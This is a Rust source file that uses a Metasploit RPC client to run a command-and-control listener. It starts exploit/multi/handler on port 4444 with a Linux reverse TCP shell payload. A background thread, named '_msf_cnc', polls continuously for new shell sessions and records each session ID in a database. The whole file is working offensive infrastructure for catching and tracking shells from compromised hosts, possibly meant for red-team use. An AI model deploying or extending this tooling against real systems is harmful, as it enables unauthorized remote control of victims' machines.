use std::collections::HashSet;
use std::collections::HashMap;

use std::{thread,time};
use std::sync::mpsc::Sender;

use msf_client::client::MsfClient;
use msf_client::conn::Conn;
use msf_client::modules::MsfModule;
use msf_client::msg::SessionListRet;

use crate::db;
use crate::models::Session;

fn _msf_cnc(conn_clone: Conn, sql_conn: db::DbConn) {
    thread::spawn(move || {
        let mut client_clone = MsfClient::new_from(conn_clone);

        let mut sids: HashSet<u32> = HashSet::new();
        let mut sess_info;
        let ten_millis = time::Duration::from_millis(10);

        // infinitely listen for new sessions
        loop {

            sess_info = client_clone.sessions().list().expect("List of current sessions");

            let new_sid_info: HashSet<u32> = sess_info.keys().cloned().collect();
            let new_sids: HashSet<u32> = new_sid_info.difference(&sids).cloned().collect();

            if new_sids.len() > 0 {
                sids = sids.union(&new_sids).cloned().collect();

                let mut new_sess_info: SessionListRet = HashMap::new();
                for new_sid in &new_sids {
                    new_sess_info.insert(new_sid.clone(), (*sess_info.get(new_sid).unwrap()).clone());

                    Session::insert(new_sid.clone() as i32, &sql_conn);
                }


 //               tx.send(new_sess_info).unwrap();
            }

            thread::sleep(ten_millis);
        }
    });
}

pub fn listener(mut client: MsfClient, sql_conn: db::DbConn) {
    let conn_clone = client.clone_conn();

    _msf_cnc(conn_clone, sql_conn);

    let mut exp_mod = client.modules()
                            .use_exploit("exploit/multi/handler");

    exp_mod.run_options.insert(String::from("LHOST"), String::from("0.0.0.0"));
    exp_mod.run_options.insert(String::from("LPORT"), String::from("4444"));
    exp_mod.run_options.insert(String::from("PAYLOAD"), String::from("linux/x86/shell/reverse_tcp"));

    let job_id_exp = exp_mod.exploit().expect("Running exploit");
    println!("{:?}", job_id_exp);

}
